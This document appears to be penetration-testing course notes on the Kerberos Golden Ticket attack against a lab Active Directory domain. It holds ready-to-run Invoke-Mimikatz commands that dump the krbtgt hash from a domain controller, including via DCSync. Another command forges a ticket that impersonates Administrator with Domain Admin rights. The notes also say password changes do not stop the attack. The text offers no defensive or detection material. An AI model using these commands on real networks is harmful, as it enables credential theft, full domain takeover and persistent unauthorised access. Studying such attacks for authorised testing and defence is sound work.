## **Golden Ticket**

A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.

Since user account validation is not done by Domain Controller(KDC service) until TGT is older than 20 minutes, we can use even deleted/revoked accounts.

The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.

Password change has no effect on this attack.

Execute mimikatz on DC as DA to get krbtgt hash
- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc

On any machine
- Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:
- Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC.
